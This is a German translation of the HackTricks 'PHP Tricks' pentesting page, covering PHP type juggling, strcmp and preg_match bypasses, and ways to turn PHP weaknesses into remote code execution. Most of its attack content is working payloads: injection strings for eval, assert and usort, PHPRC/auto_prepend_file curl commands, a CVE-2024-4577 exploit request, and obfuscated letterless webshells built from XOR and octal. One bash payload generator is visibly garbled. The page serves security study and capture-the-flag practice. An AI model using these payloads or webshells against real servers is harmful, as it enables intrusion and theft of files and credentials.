# PHP Tricks

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

<figure><img src="../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Cookies √ºbliche Position:

Dies gilt auch f√ºr phpMyAdmin-Cookies.

Cookies:
```
PHPSESSID
phpMyAdmin
```
Standorte:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## Umgehen von PHP-Vergleichen

### Lose Vergleiche/Typumwandlung ( == )

Wenn `==` in PHP verwendet wird, gibt es unerwartete F√§lle, in denen der Vergleich nicht wie erwartet funktioniert. Das liegt daran, dass "==" nur Werte vergleicht, die in denselben Typ umgewandelt wurden. Wenn Sie auch vergleichen m√∂chten, dass der Typ der verglichenen Daten derselbe ist, m√ºssen Sie `===` verwenden.

PHP-Vergleichstabellen: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (567).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> True` Ein String, der nicht mit einer Zahl beginnt, ist gleich einer Zahl
* `"0xAAAA" == "43690" -> True` Strings, die aus Zahlen im Dezimal- oder Hexadezimalformat bestehen, k√∂nnen mit anderen Zahlen/Strings verglichen werden, wobei das Ergebnis True ist, wenn die Zahlen gleich sind (Zahlen in einem String werden als Zahlen interpretiert)
* `"0e3264578" == 0 --> True` Ein String, der mit "0e" beginnt und gefolgt von irgendetwas ist, wird gleich 0 sein
* `"0X3264578" == 0X --> True` Ein String, der mit "0" beginnt und gefolgt von einem beliebigen Buchstaben (X kann jeder Buchstabe sein) und gefolgt von irgendetwas ist, wird gleich 0 sein
* `"0e12334" == "0" --> True` Dies ist sehr interessant, da Sie in einigen F√§llen die String-Eingabe von "0" und einige Inhalte, die gehasht und damit verglichen werden, steuern k√∂nnen. Daher, wenn Sie einen Wert bereitstellen k√∂nnen, der einen Hash erzeugt, der mit "0e" beginnt und ohne Buchstaben ist, k√∂nnten Sie den Vergleich umgehen. Sie k√∂nnen **bereits gehashte Strings** mit diesem Format hier finden: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> True` Jeder Buchstabe in einem String ist gleich int 0

Weitere Informationen unter [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in\_array()**

**Typumwandlung** betrifft auch die Funktion `in_array()` standardm√§√üig (Sie m√ºssen das dritte Argument auf true setzen, um einen strengen Vergleich durchzuf√ºhren):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

Wenn diese Funktion f√ºr **irgendeine Authentifizierungs√ºberpr√ºfung** (wie das √úberpr√ºfen des Passworts) verwendet wird und der Benutzer eine Seite des Vergleichs kontrolliert, kann er ein leeres Array anstelle eines Strings als Wert des Passworts senden (`https://example.com/login.php/?username=admin&password[]=`) und diese √úberpr√ºfung umgehen:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
Der gleiche Fehler tritt bei `strcasecmp()` auf

### Strikte Typumwandlung

Selbst wenn `===` **verwendet wird**, k√∂nnte es Fehler geben, die den **Vergleich anf√§llig** f√ºr **Typumwandlung** machen. Zum Beispiel, wenn der Vergleich **die Daten in einen anderen Typ von Objekt umwandelt, bevor er vergleicht**:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

**`preg_match()`** k√∂nnte verwendet werden, um **Benutzereingaben zu validieren** (es **pr√ºft**, ob ein **Wort/Regex** aus einer **Blacklist** in der **Benutzereingabe** **vorhanden** ist, und wenn nicht, kann der Code seine Ausf√ºhrung fortsetzen).

#### New line bypass

Wenn jedoch der Anfang des Regex mit `preg_match()` **nur die erste Zeile der Benutzereingabe √ºberpr√ºft**, dann k√∂nntest du, wenn du die Eingabe in **mehreren Zeilen** **senden** kannst, in der Lage sein, diese √úberpr√ºfung zu umgehen. Beispiel:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
Um diese √úberpr√ºfung zu umgehen, k√∂nnten Sie **den Wert mit URL-kodierten Zeilenumbr√ºchen** (`%0A`) senden oder, wenn Sie **JSON-Daten** senden k√∂nnen, senden Sie es in **mehreren Zeilen**:
```php
{
"cmd": "cat /etc/passwd"
}
```
Finden Sie ein Beispiel hier: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **L√§ngenfehler-Bypass**

(Dieser Bypass wurde anscheinend auf PHP 5.2.5 ausprobiert und ich konnte ihn auf PHP 7.3.15 nicht zum Laufen bringen)\
Wenn Sie `preg_match()` eine g√ºltige sehr **gro√üe Eingabe** senden k√∂nnen, **wird es nicht in der Lage sein, sie zu verarbeiten** und Sie werden in der Lage sein, die √úberpr√ºfung zu **umgehen**. Zum Beispiel, wenn es eine JSON auf die schwarze Liste setzt, k√∂nnten Sie senden:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
From: [https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0](https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0)

#### ReDoS Bypass

Trick von: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223) und [https://mizu.re/post/pong](https://mizu.re/post/pong)

<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

Kurz gesagt, das Problem tritt auf, weil die `preg_*` Funktionen in PHP auf der [PCRE-Bibliothek](http://www.pcre.org/) basieren. In PCRE werden bestimmte regul√§re Ausdr√ºcke durch viele rekursive Aufrufe abgeglichen, was viel Stack-Speicher ben√∂tigt. Es ist m√∂glich, ein Limit f√ºr die Anzahl der erlaubten Rekursionen festzulegen, aber in PHP betr√§gt dieses Limit [standardm√§√üig 100.000](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit), was mehr ist, als im Stack passt.

[Dieser Stackoverflow-Thread](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error) wurde ebenfalls in dem Beitrag verlinkt, in dem ausf√ºhrlicher √ºber dieses Problem gesprochen wird. Unsere Aufgabe war nun klar:\
**Sende eine Eingabe, die die Regex dazu bringt, 100\_000+ Rekursionen durchzuf√ºhren, was zu SIGSEGV f√ºhrt, wodurch die `preg_match()` Funktion `false` zur√ºckgibt und die Anwendung denkt, dass unsere Eingabe nicht b√∂sartig ist, und am Ende des Payloads eine √úberraschung wie `{system(<verybadcommand>)}` wirft, um SSTI --> RCE --> Flag :) zu erhalten.**

Nun, in Bezug auf Regex machen wir tats√§chlich keine 100k "Rekursionen", sondern z√§hlen stattdessen "Backtracking-Schritte", die, wie die [PHP-Dokumentation](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) angibt, standardm√§√üig auf 1\_000\_000 (1M) in der Variablen `pcre.backtrack_limit` eingestellt ist.\
Um das zu erreichen, wird `'X'*500_001` zu 1 Million Backtracking-Schritten f√ºhren (500k vorw√§rts und 500k r√ºckw√§rts):
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### Typ-Juggling zur PHP-Obfuskation
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## Execute After Redirect (EAR)

Wenn PHP zu einer anderen Seite umleitet, aber keine **`die`** oder **`exit`** Funktion **nach dem Setzen des Headers `Location`** aufgerufen wird, f√ºhrt PHP die Ausf√ºhrung fort und f√ºgt die Daten zum Body hinzu:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## Path Traversal und File Inclusion Ausnutzung

Check:

{% content-ref url="../../../pentesting-web/file-inclusion/" %}
[file-inclusion](../../../pentesting-web/file-inclusion/)
{% endcontent-ref %}

## Weitere Tricks

* **register\_globals**: In **PHP < 4.1.1.1** oder wenn falsch konfiguriert, kann **register\_globals** aktiv sein (oder ihr Verhalten wird nachgeahmt). Das bedeutet, dass in globalen Variablen wie $\_GET, wenn sie einen Wert haben z.B. $\_GET\["param"]="1234", Sie darauf √ºber **$param zugreifen k√∂nnen. Daher k√∂nnen Sie durch das Senden von HTTP-Parametern Variablen √ºberschreiben**, die im Code verwendet werden.
* Die **PHPSESSION-Cookies der gleichen Domain werden am gleichen Ort gespeichert**, daher, wenn innerhalb einer Domain **verschiedene Cookies in verschiedenen Pfaden verwendet werden**, k√∂nnen Sie einen Pfad so gestalten, dass er das Cookie des anderen Pfades zugreift, indem er den Wert des anderen Pfad-Cookies setzt.\
Auf diese Weise, wenn **beide Pfade auf eine Variable mit dem gleichen Namen zugreifen**, k√∂nnen Sie den **Wert dieser Variablen in path1 auf path2 anwenden**. Und dann wird path2 die Variablen von path1 als g√ºltig betrachten (indem das Cookie den Namen erh√§lt, der ihm in path2 entspricht).
* Wenn Sie die **Benutzernamen** der Benutzer der Maschine haben. √úberpr√ºfen Sie die Adresse: **/\~\<BENUTZERNAME>**, um zu sehen, ob die PHP-Verzeichnisse aktiviert sind.
* [**LFI und RCE mit php-Wrappers**](../../../pentesting-web/file-inclusion/)

### password\_hash/password\_verify

Diese Funktionen werden typischerweise in PHP verwendet, um **Hashes aus Passw√∂rtern zu generieren** und um zu **√ºberpr√ºfen**, ob ein Passwort im Vergleich zu einem Hash korrekt ist.\
Die unterst√ºtzten Algorithmen sind: `PASSWORD_DEFAULT` und `PASSWORD_BCRYPT` (beginnt mit `$2y$`). Beachten Sie, dass **PASSWORD\_DEFAULT h√§ufig dasselbe wie PASSWORD\_BCRYPT ist.** Und derzeit hat **PASSWORD\_BCRYPT** eine **Gr√∂√üenbeschr√§nkung im Eingabewert von 72 Bytes**. Daher, wenn Sie versuchen, etwas Gr√∂√üeres als 72 Bytes mit diesem Algorithmus zu hashen, werden nur die ersten 72B verwendet:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### HTTP-Header-Bypass durch Ausnutzung von PHP-Fehlern

#### Fehler verursachen nach dem Setzen von Headern

Aus [**diesem Twitter-Thread**](https://twitter.com/pilvar222/status/1784618120902005070?t=xYn7KdyIvnNOlkVaGbgL6A\&s=19) kann man sehen, dass das Senden von mehr als 1000 GET-Parametern oder 1000 POST-Parametern oder 20 Dateien dazu f√ºhrt, dass PHP die Header in der Antwort nicht setzen wird.

Dies erm√∂glicht es, beispielsweise CSP-Header zu umgehen, die in Codes wie:
```php
<?php
header("Content-Security-Policy: default-src 'none';");
if (isset($_GET["xss"])) echo $_GET["xss"];
```
#### F√ºllen eines K√∂rpers, bevor Header gesetzt werden

Wenn eine **PHP-Seite Fehler ausgibt und einige vom Benutzer bereitgestellte Eingaben zur√ºckgibt**, kann der Benutzer den PHP-Server dazu bringen, einige **Inhalte auszugeben, die lang genug sind**, sodass der Server beim Versuch, **die Header** in die Antwort hinzuzuf√ºgen, einen Fehler ausl√∂st.\
Im folgenden Szenario lie√ü der **Angreifer den Server einige gro√üe Fehler ausgeben**, und wie Sie auf dem Bildschirm sehen k√∂nnen, als PHP versuchte, **die Header-Informationen zu √§ndern, konnte es nicht** (zum Beispiel wurde der CSP-Header nicht an den Benutzer gesendet):

![](<../../../.gitbook/assets/image (1085).png>)

## SSRF in PHP-Funktionen

√úberpr√ºfen Sie die Seite:

{% content-ref url="php-ssrf.md" %}
[php-ssrf.md](php-ssrf.md)
{% endcontent-ref %}

## Codeausf√ºhrung

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[√úberpr√ºfen Sie dies f√ºr n√ºtzliche PHP-Funktionen](php-useful-functions-disable\_functions-open\_basedir-bypass/)

### **RCE √ºber** **preg\_replace()**
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
Um den Code im "replace"-Argument auszuf√ºhren, ist mindestens ein Treffer erforderlich.\
Diese Option von preg\_replace ist **seit PHP 5.5.0 veraltet.**

### **RCE √ºber Eval()**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **RCE √ºber Assert()**

Diese Funktion innerhalb von php erm√∂glicht es Ihnen, **Code, der in einer Zeichenkette geschrieben ist, auszuf√ºhren**, um **true oder false zur√ºckzugeben** (und je nach dem die Ausf√ºhrung zu √§ndern). Normalerweise wird die Benutzervariable in die Mitte einer Zeichenkette eingef√ºgt. Zum Beispiel:\
`assert("strpos($_GET['page']),'..') === false")` --> In diesem Fall k√∂nnten Sie tun, um **RCE** zu erhalten:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
Du musst die **Code-Syntax** **brechen**, dein **Payload** **hinzuf√ºgen** und es dann **wieder reparieren**. Du kannst **logische Operationen** wie "**and" oder "%26%26" oder "|"** verwenden. Beachte, dass "or", "||" nicht funktioniert, da unser Payload nicht ausgef√ºhrt wird, wenn die erste Bedingung wahr ist. Ebenso funktioniert ";" nicht, da unser Payload nicht ausgef√ºhrt wird.

**Andere Option** ist, den Befehl zur Ausf√ºhrung an die Zeichenkette hinzuzuf√ºgen: `'.highlight_file('.passwd').'`

**Andere Option** (wenn du den internen Code hast) ist, eine Variable zu √§ndern, um die Ausf√ºhrung zu ver√§ndern: `$file = "hola"`

### **RCE √ºber usort()**

Diese Funktion wird verwendet, um ein Array von Elementen mit einer bestimmten Funktion zu sortieren.\
Um diese Funktion auszunutzen:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
You can also use **//** um den Rest des Codes zu kommentieren.

Um die Anzahl der Klammern zu entdecken, die Sie schlie√üen m√ºssen:

* `?order=id;}//`: wir erhalten eine Fehlermeldung (`Parse error: syntax error, unexpected ';'`). Wahrscheinlich fehlen uns eine oder mehrere Klammern.
* `?order=id);}//`: wir erhalten eine **Warnung**. Das scheint richtig zu sein.
* `?order=id));}//`: wir erhalten eine Fehlermeldung (`Parse error: syntax error, unexpected ')' i`). Wahrscheinlich haben wir zu viele schlie√üende Klammern.

### **RCE √ºber .httaccess**

Wenn Sie eine **.htaccess** **hochladen** k√∂nnen, dann k√∂nnen Sie mehrere Dinge **konfigurieren** und sogar Code ausf√ºhren (indem Sie konfigurieren, dass Dateien mit der Erweiterung .htaccess **ausgef√ºhrt** werden k√∂nnen).

Verschiedene .htaccess-Shells finden Sie [hier](https://github.com/wireghoul/htshells)

### RCE √ºber Env-Variablen

Wenn Sie eine Schwachstelle finden, die es Ihnen erm√∂glicht, **Umgebungsvariablen in PHP zu √§ndern** (und eine andere, um Dateien hochzuladen, obwohl dies mit mehr Forschung m√∂glicherweise umgangen werden kann), k√∂nnten Sie dieses Verhalten ausnutzen, um **RCE** zu erhalten.

* [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld\_preload-and-ld\_library\_path): Diese Umgebungsvariable erm√∂glicht es Ihnen, beliebige Bibliotheken beim Ausf√ºhren anderer Bin√§rdateien zu laden (obwohl es in diesem Fall m√∂glicherweise nicht funktioniert).
* **`PHPRC`** : Weist PHP an, **wo es seine Konfigurationsdatei finden soll**, die normalerweise `php.ini` hei√üt. Wenn Sie Ihre eigene Konfigurationsdatei hochladen k√∂nnen, verwenden Sie `PHPRC`, um PHP darauf zu verweisen. F√ºgen Sie einen **`auto_prepend_file`**-Eintrag hinzu, der eine zweite hochgeladene Datei angibt. Diese zweite Datei enth√§lt normalen **PHP-Code, der dann** von der PHP-Laufzeitumgebung vor jedem anderen Code ausgef√ºhrt wird.
1. Laden Sie eine PHP-Datei mit unserem Shellcode hoch
2. Laden Sie eine zweite Datei hoch, die eine **`auto_prepend_file`**-Direktive enth√§lt, die den PHP-Pr√§prozessor anweist, die Datei aus Schritt 1 auszuf√ºhren
3. Setzen Sie die `PHPRC`-Variable auf die Datei, die wir in Schritt 2 hochgeladen haben.
* Erhalten Sie weitere Informationen, wie Sie diese Kette [**aus dem urspr√ºnglichen Bericht**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/) ausf√ºhren k√∂nnen.
* **PHPRC** - eine weitere Option
* Wenn Sie **keine Dateien hochladen k√∂nnen**, k√∂nnten Sie in FreeBSD die "Datei" `/dev/fd/0` verwenden, die den **`stdin`** enth√§lt, der den **K√∂rper** der an den `stdin` gesendeten Anfrage darstellt:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
* Oder um RCE zu erhalten, aktivieren Sie **`allow_url_include`** und f√ºgen Sie eine Datei mit **base64 PHP-Code** hinzu:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
* Technik [**aus diesem Bericht**](https://vulncheck.com/blog/juniper-cve-2023-36845).

### XAMPP CGI RCE - CVE-2024-4577

Der Webserver analysiert HTTP-Anfragen und leitet sie an ein PHP-Skript weiter, das eine Anfrage wie [`http://host/cgi.php?foo=bar`](http://host/cgi.php?foo=bar\&ref=labs.watchtowr.com) als `php.exe cgi.php foo=bar` ausf√ºhrt, was eine Parameterinjektion erm√∂glicht. Dies w√ºrde es erm√∂glichen, die folgenden Parameter zu injizieren, um den PHP-Code aus dem K√∂rper zu laden:
```jsx
-d allow_url_include=1 -d auto_prepend_file=php://input
```
Dar√ºber hinaus ist es m√∂glich, den "-" Parameter mit dem 0xAD Zeichen zu injizieren, aufgrund der sp√§teren Normalisierung von PHP. √úberpr√ºfen Sie das Exploit-Beispiel aus [**diesem Beitrag**](https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/):
```jsx
POST /test.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: {{host}}
User-Agent: curl/8.3.0
Accept: */*
Content-Length: 23
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

<?php
phpinfo();
?>

```
## PHP Sanitization bypass & Brain Fuck

[**In diesem Beitrag**](https://blog.redteam-pentesting.de/2024/moodle-rce/) sind gro√üartige Ideen zu finden, um einen Brain Fuck PHP-Code mit sehr wenigen erlaubten Zeichen zu generieren.\
Dar√ºber hinaus wird auch eine interessante M√∂glichkeit vorgeschlagen, Funktionen auszuf√ºhren, die es erm√∂glichten, mehrere √úberpr√ºfungen zu umgehen:
```php
(1)->{system($_GET[chr(97)])}
```
## PHP Statische Analyse

√úberpr√ºfen Sie, ob Sie Code in Aufrufen dieser Funktionen einf√ºgen k√∂nnen (von [hier](https://www.youtube.com/watch?v=SyWUsN0yHKI\&feature=youtu.be)):
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
Wenn Sie eine PHP-Anwendung debuggen, k√∂nnen Sie die Fehlerausgabe global aktivieren, indem Sie `display_errors = On` in `/etc/php5/apache2/php.ini` hinzuf√ºgen und Apache neu starten: `sudo systemctl restart apache2`

### Deobfuskation von PHP-Code

Sie k√∂nnen das **Web**[ **www.unphp.net**](http://www.unphp.net) **verwenden, um PHP-Code zu deobfuskieren.**

## PHP Wrapper & Protokolle

PHP-Wrapper und Protokolle k√∂nnten es Ihnen erm√∂glichen, **Schreib- und Lese-Schutzma√ünahmen** in einem System zu umgehen und es zu kompromittieren. F√ºr [**weitere Informationen √ºberpr√ºfen Sie diese Seite**](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols).

## Xdebug nicht authentifizierte RCE

Wenn Sie sehen, dass **Xdebug** in einer `phpconfig()`-Ausgabe **aktiviert** ist, sollten Sie versuchen, RCE √ºber [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit) zu erhalten.

## Variable Variablen
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## RCE durch Missbrauch von neuen $\_GET\["a"]\($\_GET\["b")

Wenn Sie auf einer Seite **ein neues Objekt einer beliebigen Klasse erstellen** k√∂nnen, k√∂nnten Sie in der Lage sein, RCE zu erlangen. √úberpr√ºfen Sie die folgende Seite, um zu lernen, wie:

{% content-ref url="php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## PHP ohne Buchstaben ausf√ºhren

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### Verwendung von Oktal
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If ¬¢___ not needed then $_($__), show_source(.passwd)
```
### XOR einfacher Shellcode

Laut [**diesem Bericht**](https://mgp25.com/ctf/Web-challenge/) ist es m√∂glich, auf diese Weise einen einfachen Shellcode zu generieren:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
Also, wenn Sie **willk√ºrlichen PHP-Code ohne Zahlen und Buchstaben ausf√ºhren** k√∂nnen, k√∂nnen Sie eine Anfrage wie die folgende senden, um diese Payload auszunutzen und willk√ºrlichen PHP-Code auszuf√ºhren:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
F√ºr eine detailliertere Erkl√§rung siehe [https://ctf-wiki.org/web/php/php/#preg\_match](https://ctf-wiki.org/web/php/php/#preg\_match)

### XOR Shellcode (innerhalb von eval)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Perl √§hnlich
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<figure><img src="../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
